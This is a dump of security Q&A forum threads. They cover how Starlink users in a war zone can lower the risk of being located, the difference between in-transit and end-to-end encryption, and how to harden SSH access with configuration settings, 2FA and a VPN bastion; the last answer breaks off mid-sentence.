"260004","260004","How to reduce/mitigate the degree to which a Starlink terminal user in a war zone is giving their position in real time?","<p>Space.com's <a href=""https://www.space.com/spacex-starlink-terminals-arrive-ukraine-elon-musk-russia"" rel=""noreferrer"">SpaceX Starlink satellite internet terminals arrive in Ukraine</a>, The Verge's <a href=""https://www.theverge.com/2022/2/28/22955339/elon-musk-spacex-starlink-ukraine-user-terminals-russia-invasion"" rel=""noreferrer"">Elon Musk’s promised Starlink terminals have reached Ukraine</a> and Vice Prime Minister of Ukraine and Minister of Digital Transformation of Ukraine's <a href=""https://twitter.com/FedorovMykhailo/status/1498392515262746630"" rel=""noreferrer"">tweet</a>:</p>
<blockquote>
<p>Starlink — here. Thanks, @elonmusk</p>
</blockquote>
<p>explain that requested Starlink coverage and terminals have been made available in Ukraine during a period of highly active warfare involving nations and equipment of advanced war fighting technology. These might include satellite, aircraft (fighters, bombers, UAVs) and ground equipment.</p>
<p><strong>Question:</strong> How to reduce/mitigate the degree to which a Starlink terminal user in a war zone is giving their position in real time?</p>
<p><em>For example</em>, does simply turning the thing on immediately identify your location as a Starlink user by radio transmissions? Do you have to start using it for data before that happens? Can its radiated signals be readily picked up from any direction?</p>
<p>What might be measures that a Starlink ground station could use to reduce or mitigate some of these risks?</p>
<p><em>For example</em>, can you use it in &quot;burst mode&quot; i.e. on for a few seconds every few minutes to make some kinds of tracking or homing more difficult? Put it in a hole in the ground lined with chicken wire to reduce low elevation radiation?</p>
","30","4","260016","<p>Apart from the Starlink uplink and satellite aerial, some relatively cheap components would let you use it at a distance. Safest would be a length of multimode fibre, and a transceiver at both ends. If they manage to locate and bomb the Starlink uplink, you are at a (relatively) safe distance and not transmitting any radio signal that might let them target your person. If 100m is a great enough distance then ordinary twisted pair Ethernet cable would carry the data ... but unscreened twisted pair does leak, slightly, and 100m is not what I would call relatively safe in a war zone with somebody trying to kill me.</p>
","9"
"260004","260004","How to reduce/mitigate the degree to which a Starlink terminal user in a war zone is giving their position in real time?","<p>Space.com's <a href=""https://www.space.com/spacex-starlink-terminals-arrive-ukraine-elon-musk-russia"" rel=""noreferrer"">SpaceX Starlink satellite internet terminals arrive in Ukraine</a>, The Verge's <a href=""https://www.theverge.com/2022/2/28/22955339/elon-musk-spacex-starlink-ukraine-user-terminals-russia-invasion"" rel=""noreferrer"">Elon Musk’s promised Starlink terminals have reached Ukraine</a> and Vice Prime Minister of Ukraine and Minister of Digital Transformation of Ukraine's <a href=""https://twitter.com/FedorovMykhailo/status/1498392515262746630"" rel=""noreferrer"">tweet</a>:</p>
<blockquote>
<p>Starlink — here. Thanks, @elonmusk</p>
</blockquote>
<p>explain that requested Starlink coverage and terminals have been made available in Ukraine during a period of highly active warfare involving nations and equipment of advanced war fighting technology. These might include satellite, aircraft (fighters, bombers, UAVs) and ground equipment.</p>
<p><strong>Question:</strong> How to reduce/mitigate the degree to which a Starlink terminal user in a war zone is giving their position in real time?</p>
<p><em>For example</em>, does simply turning the thing on immediately identify your location as a Starlink user by radio transmissions? Do you have to start using it for data before that happens? Can its radiated signals be readily picked up from any direction?</p>
<p>What might be measures that a Starlink ground station could use to reduce or mitigate some of these risks?</p>
<p><em>For example</em>, can you use it in &quot;burst mode&quot; i.e. on for a few seconds every few minutes to make some kinds of tracking or homing more difficult? Put it in a hole in the ground lined with chicken wire to reduce low elevation radiation?</p>
","30","4","260039","<p>Starlink terminals are different from your average satellite phone in one important regard: their antenna is directional. It is a phased array.</p>
<p>This has two important consequences:</p>
<ol>
<li>The total radio power emitted is less than it would be, should the transmitter be omnidirectional. It is like 2W - comparable to an old-fashioned 2G phone and few times less than Iridium and likes for a great deal more bandwidth.</li>
</ol>
<p>I didn't find easilly available information about the existence of any kind of transmitter power control. It is quite possible (and in general a good engineering practice) that the transmitted power is reduced when the link conditions (satellite position and/or the weather) are favorable.</p>
<p>The (averaged) transmit power also depends on the upload data rate. It will be 20-50 times less if the connection is used to download information at the maximum rate (compared to the upload at the maximum rate) and much less when it is lightly used or idle.</p>
<ol start=""2"">
<li>The emitted radio power is concentrated in a quite narrow beam pointing at some satellite. The beam width is like 1-2 degrees.</li>
</ol>
<p>The same technology that makes it efficient also makes it much less detectable. If the detector is not in or near the beam, it will get orders of magnitude less radio power from the antenna, compared to the ordinary satellite phone. It may as well fail to detect it.</p>
<p>I don't know how much sensitive is the military equipment used for this purpose. Either way, the detection is much harder and much more error-prone.</p>
<hr />
<p>Edit:</p>
<p>The above is completely true about Starlink terminal V1 (with the circle antenna) when used with wired (Ethernet) connection only and the WiFi disabled or, better yet, the router completely unplugged. V1 is perfectly usable without the bundled-in WiFi router. The white cable from the bundle can be connected to a third-party Ethernet-only router or directly to the computer's Ethernet port.</p>
<p>The V2 terminal (with the rectangular antenna) does not have Ethernet capabilities bundled in. It requires an &quot;Ethernet adapter&quot; that is ordered separately. The WiFi router acts as a power supply for the dish, so it cannot be completely and securely unplugged as in V1. I am not aware whether the WiFi can be reliably turned off in the V2 software when only the Ethernet port is used.</p>
<p>More comments about radio-securing V2 are welcome.</p>
<hr />
<p>Edit2:</p>
<p>Various people on the Internet succeeded in making V2 completely &quot;wired&quot; by cutting the router-side proprietary connector off the cable, crimping an Ethernet RJ-45 plug instead (the cable looks like a beefed-up Ethernet with the usual color scheme) and using a third-party POE injectors with sufficient power rating (aim for 48V, 2A or maybe less with the snow melting function disabled).</p>
<p>I don't have V2 available to test, but the idea looks right.</p>
","25"
"260004","260004","How to reduce/mitigate the degree to which a Starlink terminal user in a war zone is giving their position in real time?","<p>Space.com's <a href=""https://www.space.com/spacex-starlink-terminals-arrive-ukraine-elon-musk-russia"" rel=""noreferrer"">SpaceX Starlink satellite internet terminals arrive in Ukraine</a>, The Verge's <a href=""https://www.theverge.com/2022/2/28/22955339/elon-musk-spacex-starlink-ukraine-user-terminals-russia-invasion"" rel=""noreferrer"">Elon Musk’s promised Starlink terminals have reached Ukraine</a> and Vice Prime Minister of Ukraine and Minister of Digital Transformation of Ukraine's <a href=""https://twitter.com/FedorovMykhailo/status/1498392515262746630"" rel=""noreferrer"">tweet</a>:</p>
<blockquote>
<p>Starlink — here. Thanks, @elonmusk</p>
</blockquote>
<p>explain that requested Starlink coverage and terminals have been made available in Ukraine during a period of highly active warfare involving nations and equipment of advanced war fighting technology. These might include satellite, aircraft (fighters, bombers, UAVs) and ground equipment.</p>
<p><strong>Question:</strong> How to reduce/mitigate the degree to which a Starlink terminal user in a war zone is giving their position in real time?</p>
<p><em>For example</em>, does simply turning the thing on immediately identify your location as a Starlink user by radio transmissions? Do you have to start using it for data before that happens? Can its radiated signals be readily picked up from any direction?</p>
<p>What might be measures that a Starlink ground station could use to reduce or mitigate some of these risks?</p>
<p><em>For example</em>, can you use it in &quot;burst mode&quot; i.e. on for a few seconds every few minutes to make some kinds of tracking or homing more difficult? Put it in a hole in the ground lined with chicken wire to reduce low elevation radiation?</p>
","30","4","260065","<blockquote>
<p>For example, can you... put it in a hole in the ground lined with chicken wire to reduce low elevation radiation?</p>
</blockquote>
<p>From Politico.com's <a href=""https://www.politico.com/news/2022/06/09/elon-musk-spacex-starlink-ukraine-00038039"" rel=""nofollow noreferrer"">UkraineX: How Elon Musk’s space satellites changed the war on the ground</a></p>
<h3>Yes!</h3>
<p>Here's a image of a Starlink ground station sitting down in a hole pointed to the sky but  with no path for near-horizontal radiation. But for wet soil the chicken wire does not seem to be necessary.</p>
<p><a href=""https://i.stack.imgur.com/TMXZX.jpg"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/TMXZX.jpg"" alt=""A Starlink antenna casts a shadow on Ukrainian frontline positions near the town of Izyum in the southern Kharkiv region of Ukraine in May. | Anatolii Stepanov for POLITICO"" /></a></p>
<blockquote>
<p>A Starlink antenna casts a shadow on Ukrainian frontline positions near the town of Izyum in the southern Kharkiv region of Ukraine in May. | Anatolii Stepanov for POLITICO</p>
</blockquote>
<p><a href=""https://i.stack.imgur.com/7NSGH.jpg"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/7NSGH.jpg"" alt=""Oleksiy, at right, on the frontline near the town of Izyum in the south of Ukraine’s Kharkiv region in May. | Anatolii Stepanov for POLITICO"" /></a></p>
<blockquote>
<p>Oleksiy, at right, on the frontline near the town of Izyum in the south of Ukraine’s Kharkiv region in May. | Anatolii Stepanov for POLITICO</p>
</blockquote>
<hr />
<p>This is covered to some extent in other answers, but considering the source I think it warrants a separate answer.</p>
<p><a href=""https://twitter.com/elonmusk/status/1499472139333746691"" rel=""nofollow noreferrer"">Tweeted</a> by SpaceX's @ElonMusk:</p>
<blockquote>
<p>Important warning: Starlink is the only non-Russian communications system still working in some parts of Ukraine, so probability of being targeted is high. Please use with caution.</p>
</blockquote>
<p><a href=""https://twitter.com/elonmusk/status/1499473384367079429"" rel=""nofollow noreferrer"">and</a></p>
<blockquote>
<p><strong>Turn on Starlink only when needed</strong> and place antenna away as far away from people as possible</p>
</blockquote>
<p>(emphasis added)</p>
<p>These are linked in CNN's <a href=""https://edition.cnn.com/2022/03/03/tech/spacex-starlink-ukraine-internet-security-risks-scn/index.html"" rel=""nofollow noreferrer"">SpaceX sent Starlink internet terminals to Ukraine. Users should be cautious, experts say</a> which also says:</p>
<blockquote>
<p>But using satellite services can be dangerous in wartime, as evidenced by a history of states using satellite signals to geolocate and target enemies, cybersecurity experts told CNN Business.</p>
<p>&quot;If an adversary has a specialized plane aloft, it can detect [a satellite] signal and home in on it,&quot; <strong>Nicholas Weaver, a security researcher at the University of California at Berkeley, said via email.</strong> &quot;It isn't necessarily easy, but the Russians have a lot of practice on tracking various signal emitters in Syria and responding. Starlink may work for the moment, but anyone setting a [Starlink] dish up in Ukraine needs to consider it as a potential giant target.&quot;</p>
<p>In short: <strong>&quot;It may be useful, but for safety's sake you don't want to set it (or really any distinctive emitter) up in Ukraine anywhere close to where you would not want a Russian bomb dropping,&quot;</strong> Weaver said.</p>
</blockquote>
<p>(emphasis added)</p>
<p><strong>update:</strong> March 5 2022 Elon Musk <a href=""https://twitter.com/elonmusk/status/1499972826828259328"" rel=""nofollow noreferrer"">tweet</a></p>
<blockquote>
<p>SpaceX reprioritized to cyber defense &amp; overcoming signal jamming.</p>
<p>Will cause slight delays in Starship &amp; Starlink V2.</p>
</blockquote>
","3"
"259903","259903","Is encryption in transit distinct from end-to-end encryption?","<p>I asked a question about HTTPS encryption as it relates to developing a web app <a href=""https://stackoverflow.com/questions/71228164/is-data-from-a-https-post-request-secure-on-the-client-side?noredirect=1#comment125948998_71228164"">here</a>. On the face of it that question has now been closed twice for not being focused enough, but if the meta discussion is anything to go by, it's more realistically because of my wrong assumptions about the topic. An exchange in the comments with another user revealed this:</p>
<blockquote>
<p><strong>There is no such thing as &quot;just encrypted in transit&quot;, that's simply a confusion from you.</strong> You are confused about how HTTPs works, which is the reason for this question and its many misconceptions. Good luck in the future :)</p>
</blockquote>
<p>This goes against what I've always assumed, so I did some further research and it seems that at least <a href=""https://tozny.com/blog/end-to-end-encryption-vs-https/"" rel=""noreferrer"">some</a> people consider HTTPS to be encryption in transit, and consider encryption in transit to be distinct from end-to-end encryption.</p>
<p>So which is true? Is encryption in transit a completely different concept to end-to-end encryption, or are they the same thing?</p>
","26","7","259907","<p>Some definitions:</p>
<ul>
<li><p><em>Encryption in transit</em> means that data is encrypted while transiting from one point to another. Typically between one client and one server.</p>
</li>
<li><p><em>End-to-end encryption</em> means that data is encrypted while in transit from its original sender and the intended final recipient. Typically between one client to another client, the routing servers only see the encrypted data without being able to decrypt it.</p>
</li>
<li><p><em>Encryption at rest</em> is when data is stored encrypted. Depending on the context, this can be on the client, the server, both of them or only one of them.</p>
</li>
</ul>
<p>HTTPS (and TLS) only provide encryption <em>in transit</em>. It is not suited for end-to-end encryption. A second layer of encryption on top of HTTPS is usually used to provide <em>end-to-end</em> encryption.</p>
","38"
"259903","259903","Is encryption in transit distinct from end-to-end encryption?","<p>I asked a question about HTTPS encryption as it relates to developing a web app <a href=""https://stackoverflow.com/questions/71228164/is-data-from-a-https-post-request-secure-on-the-client-side?noredirect=1#comment125948998_71228164"">here</a>. On the face of it that question has now been closed twice for not being focused enough, but if the meta discussion is anything to go by, it's more realistically because of my wrong assumptions about the topic. An exchange in the comments with another user revealed this:</p>
<blockquote>
<p><strong>There is no such thing as &quot;just encrypted in transit&quot;, that's simply a confusion from you.</strong> You are confused about how HTTPs works, which is the reason for this question and its many misconceptions. Good luck in the future :)</p>
</blockquote>
<p>This goes against what I've always assumed, so I did some further research and it seems that at least <a href=""https://tozny.com/blog/end-to-end-encryption-vs-https/"" rel=""noreferrer"">some</a> people consider HTTPS to be encryption in transit, and consider encryption in transit to be distinct from end-to-end encryption.</p>
<p>So which is true? Is encryption in transit a completely different concept to end-to-end encryption, or are they the same thing?</p>
","26","7","259916","<p>To visualize A. Hersean's answer:</p>
<pre><code>       End-to-End     In-Transit
      ┌───┐        │       ┌───┐
Client│   │ hello  │ Client│   │ hello
      └─┬─┘        │       └─▲─┘
        │   uryyb  │         │   uryyb
      ┌─▼─┐        │       ┌─▼─┐
Server│   │ uryyb  │ Server│   │ hello
      └─┬─┘        │       └───┘
        │   uryyb  │
      ┌─▼─┐        ├────────────────────
Client│   │ hello  │
      └───┘        │       ┌───┐
                   │ Client│   │ hello
                   │       └─┬─┘
                   │         │   uryyb
                   │       ┌─▼─┐
                   │ Server│   │ hello
                   │       └─┬─┘
                   │         │   uryyb
                   │ Client┌─▼─┐
                   │       │   │ hello
                   │       └───┘
                   │
</code></pre>
","44"
"259903","259903","Is encryption in transit distinct from end-to-end encryption?","<p>I asked a question about HTTPS encryption as it relates to developing a web app <a href=""https://stackoverflow.com/questions/71228164/is-data-from-a-https-post-request-secure-on-the-client-side?noredirect=1#comment125948998_71228164"">here</a>. On the face of it that question has now been closed twice for not being focused enough, but if the meta discussion is anything to go by, it's more realistically because of my wrong assumptions about the topic. An exchange in the comments with another user revealed this:</p>
<blockquote>
<p><strong>There is no such thing as &quot;just encrypted in transit&quot;, that's simply a confusion from you.</strong> You are confused about how HTTPs works, which is the reason for this question and its many misconceptions. Good luck in the future :)</p>
</blockquote>
<p>This goes against what I've always assumed, so I did some further research and it seems that at least <a href=""https://tozny.com/blog/end-to-end-encryption-vs-https/"" rel=""noreferrer"">some</a> people consider HTTPS to be encryption in transit, and consider encryption in transit to be distinct from end-to-end encryption.</p>
<p>So which is true? Is encryption in transit a completely different concept to end-to-end encryption, or are they the same thing?</p>
","26","7","259917","<blockquote>
<p>Is encryption in transit distinct from end-to-end encryption?</p>
</blockquote>
<p>This is like asking: &quot;Is a vehicle distinct from a car?&quot;</p>
<p>The word &quot;is&quot; can function as a copula, and does not necessarily mean two things are equal.</p>
<p>A car <em>is</em> a vehicle. This means a car is a type of a vehicle. It does not mean that a car equals a vehicle.</p>
<p>End-to-end encryption is a type of in-transit encryption.</p>
<blockquote>
<p>So which is true? Is encryption in transit a completely different concept to end-to-end encryption, or are they the same thing?</p>
</blockquote>
<p>Neither are they the same thing, not are they completely different. See the above discussion of the word &quot;is.&quot;</p>
<p>The other answers have already explained how end-to-end encryption is differentiated from other types of in-transit encryption.</p>
<p>In particular, client-to-server encryption is usually <em>not</em> called &quot;end-to-end encryption.&quot; The term &quot;end-to-end encryption&quot; is usually reserved for encryption from one client all the way to the another client, where the server in between does not see the decrypted traffic.</p>
","6"
"259903","259903","Is encryption in transit distinct from end-to-end encryption?","<p>I asked a question about HTTPS encryption as it relates to developing a web app <a href=""https://stackoverflow.com/questions/71228164/is-data-from-a-https-post-request-secure-on-the-client-side?noredirect=1#comment125948998_71228164"">here</a>. On the face of it that question has now been closed twice for not being focused enough, but if the meta discussion is anything to go by, it's more realistically because of my wrong assumptions about the topic. An exchange in the comments with another user revealed this:</p>
<blockquote>
<p><strong>There is no such thing as &quot;just encrypted in transit&quot;, that's simply a confusion from you.</strong> You are confused about how HTTPs works, which is the reason for this question and its many misconceptions. Good luck in the future :)</p>
</blockquote>
<p>This goes against what I've always assumed, so I did some further research and it seems that at least <a href=""https://tozny.com/blog/end-to-end-encryption-vs-https/"" rel=""noreferrer"">some</a> people consider HTTPS to be encryption in transit, and consider encryption in transit to be distinct from end-to-end encryption.</p>
<p>So which is true? Is encryption in transit a completely different concept to end-to-end encryption, or are they the same thing?</p>
","26","7","259933","<p>Both in-transit and end-to-end describe different concepts which are thus obviously not identical. Encryption in-transit is between the &quot;nodes&quot; of communication, whereas encrypting end-to-end is over the entire range of communication.</p>
<pre><code> |--transit-|  |-transit--|

Client &lt;-&gt; Server &lt;-&gt; Client

 |----- end-to-end ------|
</code></pre>
<p>However, there is an overlap if the transit happens to be directly between the ends of communication.</p>
<p>This is the case when the ends of communication <em>are</em> the client and server of an HTTPS connection, for example because the two exchange data via POST. In this case, the transit <em>between</em> server and client and the ends <em>of</em> server and client describe the exact same range.</p>
<pre><code> |--transit-|

Client &lt;-&gt; Server

 |end-to-end|
</code></pre>
<p>Being aware of this edge case is important because it means trying to gain better security in such a case by &quot;switching&quot; from in-transit to end-to-end encryption is a red herring.</p>
","1"
"259903","259903","Is encryption in transit distinct from end-to-end encryption?","<p>I asked a question about HTTPS encryption as it relates to developing a web app <a href=""https://stackoverflow.com/questions/71228164/is-data-from-a-https-post-request-secure-on-the-client-side?noredirect=1#comment125948998_71228164"">here</a>. On the face of it that question has now been closed twice for not being focused enough, but if the meta discussion is anything to go by, it's more realistically because of my wrong assumptions about the topic. An exchange in the comments with another user revealed this:</p>
<blockquote>
<p><strong>There is no such thing as &quot;just encrypted in transit&quot;, that's simply a confusion from you.</strong> You are confused about how HTTPs works, which is the reason for this question and its many misconceptions. Good luck in the future :)</p>
</blockquote>
<p>This goes against what I've always assumed, so I did some further research and it seems that at least <a href=""https://tozny.com/blog/end-to-end-encryption-vs-https/"" rel=""noreferrer"">some</a> people consider HTTPS to be encryption in transit, and consider encryption in transit to be distinct from end-to-end encryption.</p>
<p>So which is true? Is encryption in transit a completely different concept to end-to-end encryption, or are they the same thing?</p>
","26","7","259934","<p>It depends on what the &quot;ends&quot; are in the application.</p>
<p>If you're using a peer-to-peer application (e.g. messaging or email) that makes use of an intermediate server, TLS can be used between each client and the server; this is encryption in transit. It's also possible for the application to encrypt and decrypt the message itself, with the server just passing this through transparently; this is end-to-end encryption.</p>
<p>But there are also many applications that are just client-server. For instance, when you use an online banking application, one end is your phone or browser, the other end is the bank's web server. In this case, you use TLS to encrypt this connection, and it's both in-transit and end-to-end encryption.</p>
<p>Often what's considered an &quot;end&quot; is a matter of abstraction levels and perspective. For example, from the perspective of the banking customer, the web site is an end by itself. But it's often the case that a complex web site is implemened using numerous devices: webserver, database servers, load balancers, etc. The TLS connection may terminate at the load balancer, or it may pass it through to the webserver. There will also be independent communication between the webserver and the database server.</p>
","2"
"259903","259903","Is encryption in transit distinct from end-to-end encryption?","<p>I asked a question about HTTPS encryption as it relates to developing a web app <a href=""https://stackoverflow.com/questions/71228164/is-data-from-a-https-post-request-secure-on-the-client-side?noredirect=1#comment125948998_71228164"">here</a>. On the face of it that question has now been closed twice for not being focused enough, but if the meta discussion is anything to go by, it's more realistically because of my wrong assumptions about the topic. An exchange in the comments with another user revealed this:</p>
<blockquote>
<p><strong>There is no such thing as &quot;just encrypted in transit&quot;, that's simply a confusion from you.</strong> You are confused about how HTTPs works, which is the reason for this question and its many misconceptions. Good luck in the future :)</p>
</blockquote>
<p>This goes against what I've always assumed, so I did some further research and it seems that at least <a href=""https://tozny.com/blog/end-to-end-encryption-vs-https/"" rel=""noreferrer"">some</a> people consider HTTPS to be encryption in transit, and consider encryption in transit to be distinct from end-to-end encryption.</p>
<p>So which is true? Is encryption in transit a completely different concept to end-to-end encryption, or are they the same thing?</p>
","26","7","259938","<h2>Depends a bit on what industry you work in.</h2>
<p>In-Transit means that the data is encrypted from the time it leaves one device and arrives at another, but end-to-end is a bit harder to nail down.</p>
<p>By some definitions End-to-End means that the data is encrypted from the time it leaves a starting device and when it arrives at another.  Or it could mean it is encrypted when it leaves one application and arrives at another. Or it could means it is encrypted from the point it is sent by one client up until it is received back by that or another client having at no point been decrypted in its handling by any servers in between.</p>
<p>Since, the exact meaning of end-to-end encryption has evolved quite a lot over the years, not all experts agree on where this line lies, espceially with all the different use cases that could apply.  There are a ton of different systems out there which some security experts claim are E2EE that other security experts claim are not. So, while your favorite recreational app may claim E2EE, it does not mean it would pass the same E2EE standards expected of a HIPPA or PCI compliant system.</p>
<p><a href=""https://i.stack.imgur.com/RFZfv.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/RFZfv.png"" alt=""enter image description here"" /></a></p>
<p>* In some setups, part of a network may act as a proxy that decrypts and processes traffic before forwarding it to its final destination. In these cases it is common to re-encrypt the data before relaying it on to where it is going, but this still creates a point of vulnerability where that proxy exists.</p>
<p>** By loser definitions of E2EE, once the data arrives at your device you are done, mission accomplished.  However, by more strict standards of E2EE, your end-point is considered the application and not the device.  In strict E2EE the data must only be decrypted in the application's isolated memory (enclave) to prevent certain kinds of malware from sniffing/tampering with it locally. Once the data is in your application's isolated memory, it becomes safer to decrypt than doing it in one application, and trying to pass it to another because malware on your device can still perform a MiM attack on data being transferred between two applications.</p>
<p>*** In some cases, (particularly where a server is considered the end-point) the data is not and can not be decrypted at all, but simply stores it in its original encrypted or hashed state. Though some might argue that this is just a long term mid-point as opposed to a true end point, so again, semantics and use cases are not always going to be the same.</p>
<p>So, as you can see, there is some over lap where the two could be one in the same, but in most cases, End-to-End takes extra steps to ensure persistent encryption in your communications that In-Transit Encryption does not.</p>
","6"
"259903","259903","Is encryption in transit distinct from end-to-end encryption?","<p>I asked a question about HTTPS encryption as it relates to developing a web app <a href=""https://stackoverflow.com/questions/71228164/is-data-from-a-https-post-request-secure-on-the-client-side?noredirect=1#comment125948998_71228164"">here</a>. On the face of it that question has now been closed twice for not being focused enough, but if the meta discussion is anything to go by, it's more realistically because of my wrong assumptions about the topic. An exchange in the comments with another user revealed this:</p>
<blockquote>
<p><strong>There is no such thing as &quot;just encrypted in transit&quot;, that's simply a confusion from you.</strong> You are confused about how HTTPs works, which is the reason for this question and its many misconceptions. Good luck in the future :)</p>
</blockquote>
<p>This goes against what I've always assumed, so I did some further research and it seems that at least <a href=""https://tozny.com/blog/end-to-end-encryption-vs-https/"" rel=""noreferrer"">some</a> people consider HTTPS to be encryption in transit, and consider encryption in transit to be distinct from end-to-end encryption.</p>
<p>So which is true? Is encryption in transit a completely different concept to end-to-end encryption, or are they the same thing?</p>
","26","7","259941","<p>I’m going to answer this simply: the terms imply different use cases.</p>
<p>End to end implies personal devices at each end.</p>
<p>In transit implies just the opposite, that there is at most 1 personal device involved.</p>
<p>But note that these are <strong>implications</strong>, not definitive statements about the terms, someone may describe a user to user connection as in transit or a user to server as end to end.</p>
","2"
"259698","259698","Best practices for securing SSH access? Is certificate-based VPN server a good solution?","<p>I run a server on a hosting. I want to harden it, but ssh access is giving me a bit of concerns.</p>
<p>I usually access from home most of the times. I have a provider subscription with the usual DHCP setup which assigns some IP address to my home. Usually it's the same. But I know it has changed some time.</p>
<p>The server has <code>ufw</code> running. Right now, I have a rule closing down ssh access to a <code>/16</code> address range because I don't want to risk myself being locked out if the provider changes IP and I have a host-only access to the server.</p>
<p>SSH access is by ssh keys btw, not password, root access is disabled and only a user can acccess.</p>
<p>So I thought I might be installing an OpenVPN server on the remote server and configure it to allow access via certificates only. I like this because it would allow me to be flexible and access from anywhere provided I have the certificate.</p>
<p>However, this got me thinking.</p>
<ul>
<li>This means that the VPN server port needs to be accessible from anywhere, while if the access is firewall based, I could lock down</li>
<li>The certs become the weak point, obviously if those get compromised they get full access (can the client certificates be password protected? I thought that doesn't apply)</li>
<li>On the other hand, for example if I request a static IP from my provider (of course, additional costs...), I could lock it down to my home only, but then I wouldn't be able to access from some other location.</li>
</ul>
<p>I am even considering a small low-resource VPS somewhere to be the jumphost, but then I have to secure that one. At least the &quot;target&quot; server is locked down to just one or two addresses.</p>
<p>What are best practices to secure the ssh access in my case?</p>
","0","3","259714","<p>OpenSSH is rather secure out of the box. The risk of suffering exploits, especially if you regularly update it, is quite low. I consider it more secure than even the best VPN servers. You can harden it using guides like <a href=""https://stribika.github.io/2015/01/04/secure-secure-shell.html"" rel=""nofollow noreferrer"">stribika's Secure Secure Shell</a> article, but that was <a href=""https://github.com/stribika/stribika.github.io/commits/master/_posts/2015-01-04-secure-secure-shell.md"" rel=""nofollow noreferrer"">last updated in 2017</a> and a lot of its suggestions (like preferring ED25519) are now defaults in OpenSSH.</p>
<p>The most important configuration changes to make in <code>sshd_config</code> are to disallow root, disallow password logins, and randomly drop failed authentications:</p>
<pre><code>PermitRootLogin no
PasswordAuthentication no

# MaxStartups is START:RATE:FULL (default = 10:30:100), where
# it randomly drops at RATE% after START failed logins within LoginGraceTime
# and increases that drop rate to 100% by FULL
MaxStartups 5:30:60
</code></pre>
<p>(Requiring a security key is roughly the same as requiring a certificate. I believe OpenSSH also supports certificates, but I suggest ED25519 keys instead.</p>
<p>For a higher level of security, you can also set up 2FA. There are many guides online describing how to do this, such as Ubuntu's <a href=""https://ubuntu.com/tutorials/configure-ssh-2fa"" rel=""nofollow noreferrer"">Configure SSH to use two-factor authentication</a> tutorial.</p>
<p>There are additional security provisions you can make, such as using an alternate port (I suggest something between ports 1-1024 since those should be restricted to root) and an automatic firewall for authentication failures (e.g. <a href=""http://www.fail2ban.org/"" rel=""nofollow noreferrer"">Fail2ban</a>, which is a more complete variation of MaxStartups). There's also the concept of <a href=""https://en.wikipedia.org/wiki/Port_knocking"" rel=""nofollow noreferrer"">port knocking</a>, which (like hosting on an alternate port) is more of a security-through-obscurity measure unless you use some sort of <a href=""https://crypto.stackexchange.com/questions/24787/removing-security-by-obscurity-from-port-knocking"">secure port-knocker</a>. I discuss alt ports, Fail2ban, and port knocking in <a href=""https://security.stackexchange.com/a/118406/42391"" title=""Running SSH on a different port vs adding the port number to a password"">this answer</a>.</p>
","3"
"259698","259698","Best practices for securing SSH access? Is certificate-based VPN server a good solution?","<p>I run a server on a hosting. I want to harden it, but ssh access is giving me a bit of concerns.</p>
<p>I usually access from home most of the times. I have a provider subscription with the usual DHCP setup which assigns some IP address to my home. Usually it's the same. But I know it has changed some time.</p>
<p>The server has <code>ufw</code> running. Right now, I have a rule closing down ssh access to a <code>/16</code> address range because I don't want to risk myself being locked out if the provider changes IP and I have a host-only access to the server.</p>
<p>SSH access is by ssh keys btw, not password, root access is disabled and only a user can acccess.</p>
<p>So I thought I might be installing an OpenVPN server on the remote server and configure it to allow access via certificates only. I like this because it would allow me to be flexible and access from anywhere provided I have the certificate.</p>
<p>However, this got me thinking.</p>
<ul>
<li>This means that the VPN server port needs to be accessible from anywhere, while if the access is firewall based, I could lock down</li>
<li>The certs become the weak point, obviously if those get compromised they get full access (can the client certificates be password protected? I thought that doesn't apply)</li>
<li>On the other hand, for example if I request a static IP from my provider (of course, additional costs...), I could lock it down to my home only, but then I wouldn't be able to access from some other location.</li>
</ul>
<p>I am even considering a small low-resource VPS somewhere to be the jumphost, but then I have to secure that one. At least the &quot;target&quot; server is locked down to just one or two addresses.</p>
<p>What are best practices to secure the ssh access in my case?</p>
","0","3","259733","<p>There is more than one way to approach this problem.</p>
<p>My own setup is that I have a small VPS with OpenVPN server installed on it and it does nothing else.</p>
<p>To SSH to my other machines I must be using VPN. On the other machines I have whitelisted the IP address of the OpenVPN server, plus a couple static addresses I can use as a last resort. Thus the SSH service is not exposed to the public Internet and the attack surface is virtually nil as it applies to most other services.</p>
<p>But the VPN is exposed though (on port 443 (SSL) so it could pass for an https site when running a cursory scan).</p>
<p>My webhost also provides a QEMU web interface to the server so I can always take over even if the firewall was to block everything.</p>
<p>If you have a residential connection with an IP address that can change infrequently but without notice, you could use <strong>DDNS</strong>. Your router might support the feature, have a look.
<a href=""https://www.cloudns.net/blog/what-is-dynamic-dns/"" rel=""nofollow noreferrer"">What is DDNS? How does it work and how to setup DDNS?</a></p>
<p>In case your home router picks up a new address it would take just a few minutes for your server to detect the change. You may need a cron job to update firewall rules, I'm not familiar with UFW.</p>
<p>If you want to be able to access your server from other remote locations, then VPN would be a good solution.</p>
<p>If all you need is to be able to SSH from home, then DDNS could suffice.</p>
<p>PS: your ISP probably has more IP address ranges than the /16 you have whitelisted. You could check against their AS number on bgp.he.net for example.</p>
","1"
"259698","259698","Best practices for securing SSH access? Is certificate-based VPN server a good solution?","<p>I run a server on a hosting. I want to harden it, but ssh access is giving me a bit of concerns.</p>
<p>I usually access from home most of the times. I have a provider subscription with the usual DHCP setup which assigns some IP address to my home. Usually it's the same. But I know it has changed some time.</p>
<p>The server has <code>ufw</code> running. Right now, I have a rule closing down ssh access to a <code>/16</code> address range because I don't want to risk myself being locked out if the provider changes IP and I have a host-only access to the server.</p>
<p>SSH access is by ssh keys btw, not password, root access is disabled and only a user can acccess.</p>
<p>So I thought I might be installing an OpenVPN server on the remote server and configure it to allow access via certificates only. I like this because it would allow me to be flexible and access from anywhere provided I have the certificate.</p>
<p>However, this got me thinking.</p>
<ul>
<li>This means that the VPN server port needs to be accessible from anywhere, while if the access is firewall based, I could lock down</li>
<li>The certs become the weak point, obviously if those get compromised they get full access (can the client certificates be password protected? I thought that doesn't apply)</li>
<li>On the other hand, for example if I request a static IP from my provider (of course, additional costs...), I could lock it down to my home only, but then I wouldn't be able to access from some other location.</li>
</ul>
<p>I am even considering a small low-resource VPS somewhere to be the jumphost, but then I have to secure that one. At least the &quot;target&quot; server is locked down to just one or two addresses.</p>
<p>What are best practices to secure the ssh access in my case?</p>
","0","3","259735","<p>Consider two servers - One running OpenSSH, and one running OpenVPN.</p>
<ul>
